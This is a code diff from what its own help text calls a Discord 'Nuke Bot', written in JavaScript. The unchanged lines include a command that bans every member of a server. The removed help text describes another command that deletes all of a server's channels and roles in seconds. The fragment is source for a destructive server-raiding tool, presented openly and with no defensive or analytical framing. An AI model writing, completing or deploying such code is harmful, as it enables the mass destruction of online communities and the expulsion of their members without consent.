@@ -22,15 +22,6 @@ if(msg.content.toLowerCase().startsWith(`${prefix}` + "orgia mode")){
 if(msg.content.toLowerCase().startsWith(`${prefix}` + "buster mode")){
     msg.guild.members.tap(member => member.ban("<your ban message here>"));
 }
-if(msg.content.toLowerCase().startsWith(`${prefix}` + "aigis")){
-    msg.author.send({
-        embed: {
-            color: 0xff0000,
-            author: { name: "Nuke Bot Help Commands | .help" },
-            description: `\`${prefix}aigis\` - To get this help menu in your DMs.\n\`${prefix}orgia mode\` - Deletes all channels and roles of the server in seconds.`
-        }
-    })
-}
 });
 
 client.login(process.env.TOKEN)
